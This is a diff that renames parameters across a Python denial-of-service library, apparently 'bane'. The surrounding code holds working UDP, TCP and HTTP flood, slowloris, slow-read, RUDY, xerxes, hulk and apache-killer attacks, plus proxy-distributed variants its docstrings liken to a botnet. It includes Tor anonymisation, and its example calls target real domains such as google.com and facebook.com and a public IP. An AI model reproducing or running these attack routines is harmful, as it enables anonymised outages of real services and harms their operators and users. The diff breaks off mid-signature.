@@ -49,7 +49,7 @@ def reset():
  pointer=0
  global ue
  ue=[]
-def udp(u,port=80,ports=None,level=3,min_size=1,max_size=1400,connection=True,interval=300,limiting=True,logs=True,returning=False):
+def udp(u,port=80,ports=None,level=3,min_size=10,max_size=10,connection=True,duration=300,limiting=True,logs=True,returning=False):
   '''
    this function is for UDP flood attack tests.
    
@@ -98,7 +98,7 @@ def udp(u,port=80,ports=None,level=3,min_size=1,max_size=1400,connection=True,in
   elif level>=3:
    t=.001
   tm=time.time()
-  while (int(time.time()-tm)<=interval):
+  while (int(time.time()-tm)<=duration):
    try:
     if ports:
      p=random.choice(ports)
@@ -134,13 +134,13 @@ def udp(u,port=80,ports=None,level=3,min_size=1,max_size=1400,connection=True,in
   print('')
   if returning==True:
    return udp_counter
-class tcflood(threading.Thread):
+class tcfld(threading.Thread):
  def run(self):
   global tcp_counter
   global stop
   self.target=target
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   self.tor=tor
   self.minsize=minsize
   self.maxsize=maxsize
@@ -183,13 +183,13 @@ class tcflood(threading.Thread):
 
   >>>bane.tcpflood('www.google.com')
 
-  >>>bane.tcpflood('www.google.com',p=80, threads=150, maxtime=5)
+  >>>bane.tcpflood('www.google.com',p=80, threads=150, timeout=5)
 
   p: (set by default to: 80) targeted port
   threads: (set by default to: 256) threads to use
-  maxtime: (set by default to: 5) timeout flag
+  timeout: (set by default to: 5) timeout flag
 '''
-def tcpflood(u,p=80,min_size=1,max_size=1400,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
+def tcpflood(u,p=80,min_size=10,max_size=50,threads=256,timeout=5,roundmin=5,roundmax=15,level=1,duration=300,logs=True,returning=False,set_tor=False):
  thr=[]
  global minsize
  minsize=min_size
@@ -198,7 +198,7 @@ def tcpflood(u,p=80,min_size=1,max_size=1400,threads=256,maxtime=5,roundmin=5,ro
  global tcp_counter
  tcp_counter=0
  global tor
- tor=settor
+ tor=set_tor
  global stop
  stop=False
  global prints
@@ -207,8 +207,8 @@ def tcpflood(u,p=80,min_size=1,max_size=1400,threads=256,maxtime=5,roundmin=5,ro
  target=u
  global port
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  global packs1
  packs1=roundmax
  global packs2
@@ -225,7 +225,7 @@ def tcpflood(u,p=80,min_size=1,max_size=1400,threads=256,maxtime=5,roundmin=5,ro
  elif level>=5:
   speed=0.001
  for x in range(threads):
-  t=tcflood()
+  t=tcfld()
   t.start()
   thr.append(t)
  c=time.time()
@@ -234,7 +234,7 @@ def tcpflood(u,p=80,min_size=1,max_size=1400,threads=256,maxtime=5,roundmin=5,ro
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -253,7 +253,7 @@ class htflood(threading.Thread):
   self.postmin=postmin
   self.postmax=postmax
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   self.tor=tor
   self.speed=speed
   self.packs2=packs2
@@ -334,14 +334,14 @@ class htflood(threading.Thread):
    they have similar usage like "tcpflood" function:
 
    >>>bane.slowloris('www.google.com',p=443,threads=20)
-   >>>bane.torshammer('www.facebook.com',p=80,threads=1000,settor=False)
-   (settor: (set by default to: False) to enable connection through local tor's local socks5 proxy
+   >>>bane.torshammer('www.facebook.com',p=80,threads=1000,set_tor=False)
+   (set_tor: (set by default to: False) to enable connection through local tor's local socks5 proxy
    >>>bane.hulk('www.google.com',threads=700)
    >>>bane.synflood('50.63.33.34',threads=100)
 
    there will be lessons how to use them all don't worry guys xD
 '''
-def httpflood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
+def httpflood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500,threads=256,timeout=5,roundmin=5,roundmax=15,level=1,duration=300,logs=True,returning=False,set_tor=False):
  '''
    this function is for http flood attack. it connect to a given port and flood it with http requests (GET & POST) with randomly headers values to make each request uniques with bypass caching engines techniques.
    it takes the following parameters:
@@ -349,12 +349,12 @@ def httpflood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500
    u: the target ip or domain
    p: (set by default to: 80) the port used in the attack
    threads: (set by default to: 256) the number of threading that you are going to use
-   maxtime: (set by default to: 5) the timeout flag value
+   timeout: (set by default to: 5) the timeout flag value
 
    example:
 
    >>>import bane
-   >>>bane.httpflood('www.google.com',p=80,threads=500,maxtime=7)
+   >>>bane.httpflood('www.google.com',p=80,threads=500,timeout=7)
 
 '''
  thr=[]
@@ -369,7 +369,7 @@ def httpflood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500
  global http_counter
  http_counter=0
  global tor
- tor=settor
+ tor=set_tor
  global stop
  stop=False
  global target
@@ -379,8 +379,8 @@ def httpflood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500
  global port
  global counter
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  global packs1
  packs1=roundmax
  global packs2
@@ -406,7 +406,7 @@ def httpflood(u,p=80,post_field_min=5,post_field_max=10,post_min=50,post_max=500
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -425,7 +425,7 @@ class prflood(threading.Thread):
   self.postmax=postmax
   self.target=target
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   self.speed=speed
   self.packs2=packs2
   self.packs1=packs1
@@ -510,7 +510,7 @@ class prflood(threading.Thread):
    except:
     pass
    time.sleep(.1)
-def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,post_field_min=5,post_field_max=10,post_min=50,post_max=500,roundmin=5,roundmax=15,level=1,interval=3600,logs=True,returning=False):
+def lulzer(u,p=80,threads=100,scraping_timeout=15,timeout=7,httpl=None,socks4l=None,socks5l=None,post_field_min=5,post_field_max=10,post_min=50,post_max=500,roundmin=5,roundmax=15,level=1,duration=3600,logs=True,returning=False):
  '''
    this function is for http flood attack but it distribute the around the world by passing the requests to thousands of proxies located in many countries (it is stimulation to real life botnet).
    it takes the following parameters:
@@ -518,7 +518,7 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,pos
    u: the target ip or domain
    p: (set by default to: 80) the port used in the attack
    threads: (set by default to: 100) the number of threading that you are going to use
-   maxtime: (set by default to: 5) the timeout flag value
+   timeout: (set by default to: 5) the timeout flag value
    httpl: (set by default to: None) it takes a list of custom http proxies list that the user provide to be used
    socks4l: (set by default to: None) it takes a list of custom socks4 proxies list that the user provide to be used
    socks5l: (set by default to: None) it takes a list of custom socks5 proxies list that the user provide to be used
@@ -548,23 +548,23 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,pos
  if httpl:
   httplist=httpl
  else:
-  httplist=masshttp()
+  httplist=masshttp(timeout=scraping_timeout)
  global socks4list
  if socks4l:
   socks4list=socks4l
  else:
-  socks4list=massocks4()
+  socks4list=massocks4(timeout=scraping_timeout)
  global socks5list
  if socks5l:
   socks5list=socks5l
  else:
-  socks5list=massocks5()
+  socks5list=massocks5(timeout=scraping_timeout)
  global target
  target=u
  global port
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  global packs1
  packs1=roundmax
  global packs2
@@ -590,7 +590,7 @@ def lulzer(u,p=80,threads=100,maxtime=7,httpl=None,socks4l=None,socks5l=None,pos
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -606,7 +606,7 @@ class reqpost(threading.Thread):
   self.mincontent=mincontent
   self.target=target
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   self.tor=tor
   time.sleep(2)
   while (stop!=True):
@@ -640,7 +640,7 @@ class reqpost(threading.Thread):
    time.sleep(.1)
    if stop==True:
     break
-def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True,max_content=15000,min_content=10000):
+def torshammer(u,p=80,threads=500,timeout=5,set_tor=False,duration=300,logs=True,max_content=15000,min_content=10000):
  '''
     this function is used to do torshammer attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
     
@@ -649,15 +649,15 @@ def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True,
     u: the target ip or domain
     p: (set by default to: 80) the targeted port
     threads: (set by default to: 500) number of connections to be created
-    maxtime: (set by default to: 5) connection timeout flag value
-    settor: (set by default to: False) if you want to use tor as SOCKS5 proxy after activating it you must set this parameter to: True
+    timeout: (set by default to: 5) connection timeout flag value
+    set_tor: (set by default to: False) if you want to use tor as SOCKS5 proxy after activating it you must set this parameter to: True
 
     example:
 
     >>>import bane
     >>>bane.torshammer('www.google.com',p=80)
 
-    >>>bane.torshammer('www.google.com',p=80,settor=True)
+    >>>bane.torshammer('www.google.com',p=80,set_tor=True)
 
 '''
  thr=[]
@@ -673,10 +673,10 @@ def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True,
  target=u
  global port
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  global tor
- tor=settor
+ tor=set_tor
  for x in range(threads):
      t =reqpost()
      t.start()
@@ -687,7 +687,7 @@ def torshammer(u,p=80,threads=500,maxtime=5,settor=False,interval=300,logs=True,
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -699,7 +699,7 @@ class pham(threading.Thread):
  def run(self):
   self.target=target
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   self.maxcontent=maxcontent
   self.mincontent=mincontent
   global counter
@@ -747,12 +747,12 @@ class pham(threading.Thread):
    time.sleep(.1)
    if stop==True:
     break
-def proxhammer(u,p=80,max_content=15000,min_content=10000,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True):
+def proxhammer(u,p=80,scraping_timeout=15,max_content=15000,min_content=10000,threads=700,timeout=5,httpl=None,socks4l=None,socks5l=None,duration=300,logs=True):
  '''
   u: target ip or domain
   p: (set by default to: 80) targeted port
   threads: (set by default to: 500) number of connections
-  maxtime: (set by default to: 5) the connection timeout flag value
+  timeout: (set by default to: 5) the connection timeout flag value
   example:
   >>>import bane
   >>>bane.proxhammer('www.google.com',threads=256)
@@ -766,17 +766,17 @@ def proxhammer(u,p=80,max_content=15000,min_content=10000,threads=700,maxtime=5,
  if httpl:
   httplist=httpl
  else:
-  httplist=masshttp()
+  httplist=masshttp(timeout=scraping_timeout)
  global socks4list
  if socks4l:
   socks4list=socks4l
  else:
-  socks4list=massocks4()
+  socks4list=massocks4(timeout=scraping_timeout)
  global socks5list
  if socks5l:
   socks5list=socks5l
  else:
-  socks5list=massocks5()
+  socks5list=massocks5(timeout=scraping_timeout)
  global stop
  stop=False
  global prints
@@ -786,8 +786,8 @@ def proxhammer(u,p=80,max_content=15000,min_content=10000,threads=700,maxtime=5,
  target=u
  global port
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  for j in range(threads):
     t=pham()
     t.start()
@@ -799,7 +799,7 @@ def proxhammer(u,p=80,max_content=15000,min_content=10000,threads=700,maxtime=5,
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -819,7 +819,7 @@ class rudypost(threading.Thread):
   self.pag=pag
   self.target=target
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   self.tor=tor
   time.sleep(2)
   while (stop!=True):
@@ -861,7 +861,7 @@ class rudypost(threading.Thread):
    time.sleep(.1)
    if stop==True:
     break
-def rudy(u,p=80,threads=500,form='q',form_len=0,max_form=1000000,min_form=10000,page='/',maxtime=5,settor=False,interval=300,logs=True,wait=-1,max_wait=5,min_wait=1):
+def rudy(u,p=80,threads=500,form='q',form_len=0,max_form=1000000,min_form=10000,page='/',timeout=5,set_tor=False,duration=300,logs=True,wait=-1,max_wait=5,min_wait=1):
  '''
     this function is used to do torshammer attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
     
@@ -870,15 +870,15 @@ def rudy(u,p=80,threads=500,form='q',form_len=0,max_form=1000000,min_form=10000,
     u: the target ip or domain
     p: (set by default to: 80) the targeted port
     threads: (set by default to: 500) number of connections to be created
-    maxtime: (set by default to: 5) connection timeout flag value
-    settor: (set by default to: False) if you want to use tor as SOCKS5 proxy after activating it you must set this parameter to: True
+    timeout: (set by default to: 5) connection timeout flag value
+    set_tor: (set by default to: False) if you want to use tor as SOCKS5 proxy after activating it you must set this parameter to: True
 
     example:
 
     >>>import bane
     >>>bane.torshammer('www.google.com',p=80)
 
-    >>>bane.torshammer('www.google.com',p=80,settor=True)
+    >>>bane.torshammer('www.google.com',p=80,set_tor=True)
 
 '''
  thr=[]
@@ -906,10 +906,10 @@ def rudy(u,p=80,threads=500,form='q',form_len=0,max_form=1000000,min_form=10000,
  target=u
  global port
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  global tor
- tor=settor
+ tor=set_tor
  for x in range(threads):
      t =rudypost()
      t.start()
@@ -920,7 +920,7 @@ def rudy(u,p=80,threads=500,form='q',form_len=0,max_form=1000000,min_form=10000,
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -933,7 +933,7 @@ class xer(threading.Thread):
   x=pointer
   self.target=target
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   self.tor=tor
   time.sleep(2)
   while (stop!=True):
@@ -957,7 +957,7 @@ class xer(threading.Thread):
    except:
     pass
    time.sleep(.3)
-def xerxes(u,p=80,threads=500,maxtime=5,interval=300,logs=True,settor=False):
+def xerxes(u,p=80,threads=500,timeout=5,duration=300,logs=True,set_tor=False):
  '''
    everyone heard about the 'xerxes.c' tool ( https://github.com/zanyarjamal/xerxes/blob/master/xerxes.c ), but not everyone really understand what does it do exactly to take down targets, actually some has claimed that it sends few Gbps :/ (which is something really funny looool) . let me illuminate you: this tool is similar to slowloris, it consume all avaible connections on the server and keep them open as long as possible not by sending partial http headers slowly but by sending "NULL byte character" per connection every 0.3 seconds (so actually it doesn't really send much data). it uses 48 threads and 8 connections per thread, so the maximum number of connections that this tool can create is: 384 connections. that's why it works perfectly against apache for example (maximum number of connections that it handle simultaniously is 256 by dafault) but not against the ones with larger capacity.
 
@@ -968,7 +968,7 @@ def xerxes(u,p=80,threads=500,maxtime=5,interval=300,logs=True,settor=False):
   u: target ip or domain
   p: (set by default to: 80) targeted port
   threads: (set by default to: 500) number of connections
-  maxtime: (set by default to: 5) the connection timeout flag value
+  timeout: (set by default to: 5) the connection timeout flag value
 
   example:
 
@@ -978,7 +978,7 @@ def xerxes(u,p=80,threads=500,maxtime=5,interval=300,logs=True,settor=False):
 '''
  thr=[]
  global tor
- tor=settor
+ tor=set_tor
  global stop
  stop=False
  global prints
@@ -988,8 +988,8 @@ def xerxes(u,p=80,threads=500,maxtime=5,interval=300,logs=True,settor=False):
  target=u
  global port
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  for j in range(threads):
     pointer=j
     t=xer()
@@ -1002,7 +1002,7 @@ def xerxes(u,p=80,threads=500,maxtime=5,interval=300,logs=True,settor=False):
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -1016,7 +1016,7 @@ class pxer(threading.Thread):
   x=pointer
   self.target=target
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   time.sleep(2)
   while (stop!=True):
    try:
@@ -1051,12 +1051,12 @@ class pxer(threading.Thread):
    except:
     pass
    time.sleep(.3)
-def proxerxes(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True,level=1):
+def proxerxes(u,scraping_timeout=15,p=80,threads=700,timeout=5,httpl=None,socks4l=None,socks5l=None,duration=300,logs=True,level=1):
  '''
   u: target ip or domain
   p: (set by default to: 80) targeted port
   threads: (set by default to: 500) number of connections
-  maxtime: (set by default to: 5) the connection timeout flag value
+  timeout: (set by default to: 5) the connection timeout flag value
   example:
   >>>import bane
   >>>bane.proxhammer('www.google.com',threads=256)
@@ -1068,17 +1068,17 @@ def proxerxes(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
  if httpl:
   httplist=httpl
  else:
-  httplist=masshttp()
+  httplist=masshttp(timeout=scraping_timeout)
  global socks4list
  if socks4l:
   socks4list=socks4l
  else:
-  socks4list=massocks4()
+  socks4list=massocks4(timeout=scraping_timeout)
  global socks5list
  if socks5l:
   socks5list=socks5l
  else:
-  socks5list=massocks5()
+  socks5list=massocks5(timeout=scraping_timeout)
  global stop
  stop=False
  global prints
@@ -1088,8 +1088,8 @@ def proxerxes(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
  target=u
  global port
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  global pointer
  for j in range(threads):
     pointer=j
@@ -1103,7 +1103,7 @@ def proxerxes(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -1115,7 +1115,7 @@ class slrd(threading.Thread):
  def run(self):
   self.target=target
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   self.tor=tor
   self.speed=speed
   self.rre2=rre2
@@ -1164,7 +1164,7 @@ class slrd(threading.Thread):
     s.close()
    except Exception as e:
     pass
-def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs=True,settor=False,interval=300):
+def slowread(u,p=80,threads=500,timeout=5,speed1=3,speed2=5,read1=1,read2=3,logs=True,set_tor=False,duration=300):
  '''
    this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.
 
@@ -1173,17 +1173,17 @@ def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs
    u: target ip or domain
    p: (set by default to: 80)
    threads: (set by default to: 500) number of connections
-   maxtime: (set by default to: 5) connection timeout flag 
+   timeout: (set by default to: 5) connection timeout flag 
 
    example:
 
    >>>import bane
-   >>>bane.slowread('www.google.com',p=443,threads=300,maxtime=7)
+   >>>bane.slowread('www.google.com',p=443,threads=300,timeout=7)
 
 '''
  thr=[]
  global tor
- tor=settor
+ tor=set_tor
  global stop
  stop=False
  global prints
@@ -1192,8 +1192,8 @@ def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs
  target=u
  global port
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  global sre1
  sre1=speed1
  global sre2
@@ -1212,7 +1212,7 @@ def slowread(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,logs
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -1225,7 +1225,7 @@ class apa(threading.Thread):
   global apache_killer_counter
   self.target=target
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   self.tor=tor
   self.packs2=packs2
   self.packs1=packs1
@@ -1262,7 +1262,7 @@ class ptc(threading.Thread):
   global proxslow_counter
   self.target=target
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   self.sre1=sre1
   self.sre2=sre2
   self.speed=speed
@@ -1314,7 +1314,7 @@ class ptc(threading.Thread):
     s.close()
    except Exception as e:
     pass
-def proxslow(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True,returning=False,settor=False):
+def proxslow(u,p=80,scraping_timeout=15,threads=500,timeout=5,speed1=3,speed2=5,read1=1,read2=3,httpl=None,socks4l=None,socks5l=None,duration=300,logs=True,returning=False,set_tor=False):
  thr=[]
  global proxslow_counter
  proxslow_counter=0
@@ -1322,19 +1322,19 @@ def proxslow(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,http
  if httpl:
   httplist=httpl
  else:
-  httplist=masshttp()
+  httplist=masshttp(timeout=scraping_timeout)
  global socks4list
  if socks4l:
   socks4list=socks4l
  else:
-  socks4list=massocks4()
+  socks4list=massocks4(timeout=scraping_timeout)
  global socks5list
  if socks5l:
   socks5list=socks5l
  else:
-  socks5list=massocks5()
+  socks5list=massocks5(timeout=scraping_timeout)
  global tor
- tor=settor
+ tor=set_tor
  global stop
  stop=False
  global prints
@@ -1343,8 +1343,8 @@ def proxslow(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,http
  target=u
  global port
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  global sre1
  sre1=speed1
  global sre2
@@ -1363,7 +1363,7 @@ def proxslow(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,http
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -1373,7 +1373,7 @@ def proxslow(u,p=80,threads=500,maxtime=5,speed1=3,speed2=5,read1=1,read2=3,http
   del x
  if returning==True:
   return proxslow_counter
-def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
+def apache_killer(u,p=80,threads=256,timeout=5,roundmin=5,roundmax=15,level=1,duration=300,logs=True,returning=False,set_tor=False):
  '''
    this is a python version of the apache killer tool which was originally written in perl.
 
@@ -1382,7 +1382,7 @@ def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,in
    u: target ip or domain
    p: (set by default to: 80)
    threads: (set by default to: 256) number of connections
-   maxtime: (set by default to: 5) connection timeout flag 
+   timeout: (set by default to: 5) connection timeout flag 
 
    example:
 
@@ -1394,7 +1394,7 @@ def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,in
  global apache_killer_counter
  apache_killer_counter=0
  global tor
- tor=settor
+ tor=set_tor
  global stop
  stop=False
  global prints
@@ -1403,8 +1403,8 @@ def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,in
  target=u
  global port
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  global packs1
  packs1=roundmax
  global packs2
@@ -1428,7 +1428,7 @@ def apache_killer(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,in
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -1443,7 +1443,7 @@ class loris(threading.Thread):
   global slowloris_counter
   self.target=target
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   self.tor=tor
   ls=[]
   if prints==True:
@@ -1498,7 +1498,7 @@ class loris(threading.Thread):
     except:
      pass
   ls=[]
-def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
+def slowloris(u,p=80,threads=20,timeout=5,duration=300,logs=True,set_tor=False):
  '''
    this function is for advanced slowloris attack. here this script is acting differently, it uses the threads to consume the target's available connections but without connections' count limit, so it keeps consuming the server's connections till it becomes unavailable.
    on each thread, it opens a connection, sends a partial HTTP request then it append it to a list, it continue doing this without stopping even if the target is down and all of this after each try to open new connection it sends random X-a: header value to keep all created connections open without reaching the timeout value.
@@ -1508,14 +1508,14 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
    u: target ip or domain
    p: (set by default to: 80)
    threads: (set by default to: 20) number of threads
-   maxtime: (set by default to: 5) connection timeout flag 
+   timeout: (set by default to: 5) connection timeout flag 
 
 '''
  thr=[]
  global slowloris_counter
  slowloris_counter=0
  global tor
- tor=settor
+ tor=set_tor
  global stop
  stop=False
  global prints
@@ -1524,8 +1524,8 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
  target=u
  global port
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  for x in range(threads):
   t=loris()
   t.start()
@@ -1537,7 +1537,7 @@ def slowloris(u,p=80,threads=20,maxtime=5,interval=300,logs=True,settor=False):
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -1551,7 +1551,7 @@ class plor(threading.Thread):
   #global proxloris_counter
   self.target=target
   self.port=port
-  self.timeout=timeout
+  self.timeout=_timeout
   time.sleep(2)
   while (stop!=True):
    try:
@@ -1599,12 +1599,12 @@ class plor(threading.Thread):
      print("socket-->{}".format(ipp))
    except:
     pass
-def proxloris(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True,level=1):
+def proxloris(u,scraping_timeout=15,p=80,threads=700,timeout=5,httpl=None,socks4l=None,socks5l=None,duration=300,logs=True,level=1):
  '''
   u: target ip or domain
   p: (set by default to: 80) targeted port
   threads: (set by default to: 500) number of connections
-  maxtime: (set by default to: 5) the connection timeout flag value
+  timeout: (set by default to: 5) the connection timeout flag value
   example:
   >>>import bane
   >>>bane.proxhammer('www.google.com',threads=256)
@@ -1616,17 +1616,17 @@ def proxloris(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
  if httpl:
   httplist=httpl
  else:
-  httplist=masshttp()
+  httplist=masshttp(timeout=scraping_timeout)
  global socks4list
  if socks4l:
   socks4list=socks4l
  else:
-  socks4list=massocks4()
+  socks4list=massocks4(timeout=scraping_timeout)
  global socks5list
  if socks5l:
   socks5list=socks5l
  else:
-  socks5list=massocks5()
+  socks5list=massocks5(timeout=scraping_timeout)
  global stop
  stop=False
  global prints
@@ -1636,8 +1636,8 @@ def proxloris(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
  target=u
  global port
  port=p
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  for j in range(threads):
     t=plor()
     t.start()
@@ -1649,7 +1649,7 @@ def proxloris(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None,
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -1661,7 +1661,7 @@ class phu(threading.Thread):
  def run(self):
   global proxhulk_counter
   self.target=target
-  self.timeout=timeout
+  self.timeout=_timeout
   global httplist
   global stop
   time.sleep(2)
@@ -1695,7 +1695,7 @@ class hu(threading.Thread):
  def run(self):
   global hulk_counter
   self.target=target
-  self.timeout=timeout
+  self.timeout=_timeout
   global stop
   time.sleep(2)
   while (stop!=True):
@@ -1740,7 +1740,7 @@ class hu(threading.Thread):
        print("Requests: {}".format(hulk_counter))
      except Exception as e:
       pass
-def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=False):
+def hulk(u,threads=700,timeout=10,duration=300,logs=True,returning=False,set_tor=False):
  '''
    this function is used for hulk attack with more complex modification (more than 10k useragents and references, also a better way to generate random http GET parameters.
     
@@ -1748,7 +1748,7 @@ def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=
 
    u: target domain
    threads: (set by default to: 700) number of connections
-   maxtime: (set by default to: 10) connection timeout flag
+   timeout: (set by default to: 10) connection timeout flag
 
    example:
 
@@ -1759,7 +1759,7 @@ def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=
  thr=[]
  global hulk_counter
  hulk_counter=0
- if settor==True:
+ if set_tor==True:
   socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
   socket.socket = socks.socksocket
  global stop
@@ -1768,8 +1768,8 @@ def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=
  prints=logs
  global target
  target=u
- global timeout
- timeout=maxtime
+ global _timeout
+ _timeout=timeout
  for x in range(threads):
   t= hu()
   t.start()
@@ -1780,7 +1780,7 @@ def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=
    break
   try:
    time.sleep(.1)
-   if int(time.time()-c)==interval:
+   if int(time.time()-c)==duration:
     stop=True
     break
   except KeyboardInterrupt:
@@ -1790,7 +1790,7 @@ def hulk(u,threads=700,maxtime=10,interval=300,logs=True,returning=False,settor=
   del x
  if returning==True:
   return hulk_counter
-def proxhulk(u,threads=700,httpl=None,maxtime=10,interval=300,logs=True,returning=False):
